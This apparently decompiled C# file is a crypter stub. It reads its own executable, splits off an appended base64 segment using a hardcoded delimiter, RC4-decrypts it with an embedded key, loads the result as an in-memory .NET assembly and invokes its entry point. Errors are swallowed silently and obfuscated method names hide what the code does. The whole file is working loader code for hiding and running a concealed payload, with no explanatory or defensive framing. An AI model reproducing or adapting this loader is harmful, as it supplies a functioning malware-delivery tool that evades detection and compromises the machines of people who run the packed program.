using System;
using System.Diagnostics;
using System.IO;
using System.Text;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

[StandardModule]
internal sealed class Class6
{
	private const string string_0 = "~-FWWLFXOSLFDÇRBXFMKDSDDBLIBOPRPCLPBKBFIFKMWDRVXKBBKÇICDLMZQ-~";

	private const string string_1 = "~-FLSÇDCYIKYBFZSFIQDZDIBBMSYWFZLSKDOBSYQFKXIKFIDMDÇMMÇXLBIQBB-~";

	private static string[] string_2;

	private static byte[] byte_0;

	static Class6()
	{
		Class11.qX5SgUyzeTRvc();
	}

	[STAThread]
	public static void Main()
	{
		smethod_0();
	}

	public static void smethod_0()
	{
		string_2 = Strings.Split(File.ReadAllText(Process.GetCurrentProcess().MainModule!.FileName), "~-FLSÇDCYIKYBFZSFIQDZDIBBMSYWFZLSKDOBSYQFKXIKFIDMDÇMMÇXLBIQBB-~", -1, (CompareMethod)0);
		byte_0 = zEbNiFqfT(Convert.FromBase64String(string_2[1]), "~-FWWLFXOSLFDÇRBXFMKDSDDBLIBOPRPCLPBKBFIFKMWDRVXKBBKÇICDLMZQ-~");
		Encoding.GetEncoding(1252).GetBytes(string_2[1]);
		smethod_1(byte_0);
	}

	public static byte[] zEbNiFqfT(byte[] byte_1, string string_3)
	{
		byte[] bytes = Encoding.ASCII.GetBytes(string_3);
		uint[] array = new uint[256];
		byte[] array2 = new byte[byte_1.Length - 1 + 1];
		object obj = default(object);
		object obj2 = default(object);
		if (ForLoopControl.ForLoopInitObj(obj, (object)0, (object)255, (object)1, ref obj2, ref obj))
		{
			do
			{
				array[Conversions.ToInteger(obj)] = Conversions.ToUInteger(obj);
			}
			while (ForLoopControl.ForNextCheckObj(obj, obj2, ref obj));
		}
		object obj3 = default(object);
		uint num = default(uint);
		if (ForLoopControl.ForLoopInitObj(obj, (object)0, (object)255, (object)1, ref obj3, ref obj))
		{
			do
			{
				num = (uint)((num + bytes[Conversions.ToInteger(Operators.ModObject(obj, (object)bytes.Length))] + array[Conversions.ToInteger(obj)]) & 0xFFuL);
				uint num2 = array[Conversions.ToInteger(obj)];
				array[Conversions.ToInteger(obj)] = array[num];
				array[num] = num2;
			}
			while (ForLoopControl.ForNextCheckObj(obj, obj3, ref obj));
		}
		uint num3 = 0u;
		num = 0u;
		int num4 = array2.Length - 1;
		for (int i = 0; i <= num4; i++)
		{
			num3 = (uint)(((ulong)num3 + 1uL) & 0xFFuL);
			num = (uint)((num + array[num3]) & 0xFFuL);
			uint num2 = array[num3];
			array[num3] = array[num];
			array[num] = num2;
			array2[i] = (byte)(byte_1[i] ^ array[(int)((long)(array[num3] + array[num]) & 0xFFL)]);
		}
		return array2;
	}

	public static void smethod_1(byte[] byte_1)
	{
		try
		{
			object obj = AppDomain.CurrentDomain.Load(byte_1);
			NewLateBinding.LateCall(NewLateBinding.LateGet(obj, (Type)null, "EntryPoint", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Invoke", new object[2] { "", null }, (string[])null, (Type[])null, (bool[])null, true);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}
}
